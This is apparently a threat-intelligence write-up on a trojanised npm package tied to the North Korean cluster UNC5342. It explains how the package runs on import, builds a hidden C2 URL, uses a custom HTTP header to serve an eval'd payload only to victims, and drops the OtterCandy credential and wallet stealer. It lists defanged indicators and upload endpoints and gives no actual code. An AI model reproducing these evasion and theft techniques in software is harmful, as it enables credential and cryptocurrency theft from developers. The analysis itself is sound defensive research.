UNC5342 NPM Malware Uses Custom Headers to Gate Malicious Payloads
docs.text: While tracking DPRK-linked weaponised npm packages, I came across an unreported technique employed by UNC5342 to evade detection and analysis. The malicious package uses a conditional serving mechanism that delivers different responses based on request authentication — effectively hiding the malicious payload while remaining operational against targets.

docs.title: Background
docs.text:
UNC5342 is a DPRK-nexus threat cluster also widely tracked as Contagious Interview — a campaign name coined by Palo Alto Networks Unit 42 to describe a persistent social engineering operation in which North Korean threat actors pose as technical recruiters to lure software developers into executing malicious code during fake job interviews.1 Active since at least 2023, the cluster predominantly targets developers in the cryptocurrency, DeFi, and financial technology sectors, distributing malware through trojanised npm packages, GitHub repositories, and coding challenge assignments. The cluster operates under multiple industry aliases including DeceptiveDevelopment, DEV#POPPER, Famous Chollima, and Void Dokkaebi.2

Google's Threat Intelligence Group (GTIG) has tracked UNC5342 incorporating EtherHiding into its delivery chain, embedding malicious JavaScript payloads within smart contracts on the BNB Smart Chain to serve as a decentralised, resilient C2 mechanism.3 SentinelOne has documented over 230 victims between January and March 2025 alone, with the actual number assessed to be significantly higher.4

OtterCandy is a Node.js-based infostealer and persistence mechanism attributed to UNC5342, first documented by security researchers in 2024. It targets cloud provider credential directories (GCP, AWS, Azure), cryptocurrency wallet applications and browser extensions, and browser-stored credentials across Chromium-based browsers. OtterCandy is typically delivered as a second-stage payload following initial execution of a malicious npm package.5 The malware is tracked separately from the related OtterCookie family, which serves as an earlier-stage infostealer in the same delivery chain.

docs.title: Technical Analysis
docs.text:
The package, hosted at "hxxps://www.npmjs[.]com/package/tailwindcss-forms-starter?activeTab=readme", masquerades as a legitimate Tailwind CSS utility for form styling.

Figure 1: Weaponised NPM Package

Upon installation via npm install tailwindcss-forms-starter, the package's main entry point immediately triggers execution through Node.js's module loading mechanism. The malicious code does not wait for explicit function calls or user interaction — it activates automatically during the import process.

docs.title: Initial Execution Chain
docs.text:
When the package is loaded, the module.exports statement immediately invokes getPlugin() with pre-configured default parameters (Figure 2).6

Figure 2: Index.js module.exports statement

This function constructs a C2 URL through deliberate string concatenation designed to evade static analysis pattern matching. Rather than hardcoding the full URL as a single string, the script assembles it from component parts (Figure 3).

Figure 3: Index.js String Concatenation

These fragments combine to form "hxxps://rest-icon-moduler.vercel[.]app/icons/777" — infrastructure hosted on Vercel's legitimate serverless platform.

Contagious Interview operators have systematically exploited Vercel as a payload delivery platform across multiple campaign waves.3 Vercel's reputation and widespread use in legitimate JavaScript development makes it an effective cover for hosting C2 infrastructure, as outbound connections to Vercel domains blend naturally into developer network traffic and are rarely blocked by enterprise proxies. Datadog Security Research similarly documented Vercel-hosted C2 in their analysis of related DPRK-linked npm packages published in 2024.7

docs.title: The Authentication Mechanism
docs.text:
The standout technique here is the custom HTTP header implementation.

Figure 4: Custom HTTP Header Implementation

Every HTTP request initiated by the script includes bearrtoken: logo in its headers. This seemingly innocuous key-value pair functions as a shared secret between the victim system and the attacker-controlled backend — not encrypted, but effective as a gating mechanism.

When the infected system makes its initial callback, the request targets /icons/777 with a node User-Agent string and the custom bearrtoken: logo header. The backend — likely a Vercel serverless function — performs header inspection on every incoming request. When the token is detected, the server responds with a structured JSON body containing a credits field holding executable JavaScript. The eval() call provides arbitrary code execution in the context of the Node.js process (Figure 5, Figure 6).

Figure 5: Parsing JSON Response, Accessing and Executing credits Field Figure 6: Manual Payload Fetching by Providing the Custom Header

docs.title: Unauthenticated Request Path
docs.text:
When a request arrives without the authentication header — as would happen with a web browser, automated scanner, or sandbox — the server takes a different code path entirely, responding with a benign image file (Figure 7). This is the anti-analysis primitive: the malicious payload is invisible to any tooling that doesn't replicate the exact header.

Figure 7: C2 Response without a bearrtoken Header

docs.title: OtterCandy Analysis
docs.text:
Analysis of the Stage 2 payload reveals multiple technical overlaps with OtterCandy.5 Once executed, the payload immediately begins searching for cloud provider credential directories — specifically targeting GCP, AWS, and Azure configuration folders (Figure 8).

Figure 8: Partial Representation of OtterCandy Malicious Logic

OtterCandy targets a broad range of cryptocurrency wallets — both standalone applications (Electrum, Atomic, Exodus, Guarda) and browser extension wallets via hardcoded Chromium extension IDs (Figure 9).

Figure 9: Browser Extension Wallet IDs

Browser credential theft covers five Chromium-based browsers: Chrome, Brave, Edge, Opera, and Yandex, with platform-specific path construction for each (Figure 10).

Figure 10: OtterCandy Infostealing Logic

The malware also builds a machine profile — generating a unique victim identifier by combining the hostname with a six-character truncated hardware-based machine ID (Figure 11).

Figure 11: OtterCandy Machine Identification Logic

All harvested data is transmitted to hxxp://95.216.37[.]186:5000. Two distinct upload endpoints handle different data types: binary files (SQLite databases, wallet data) go to /file-upload via HTTP POST, while text-based content (decrypted passwords, environment files) goes to /content-upload as JSON. Upon establishing a Socket.io connection, OtterCandy immediately begins uploading cloud credentials without waiting for operator commands (Figure 12).

Figure 12: OtterCandy Server-side Upload Infrastructure
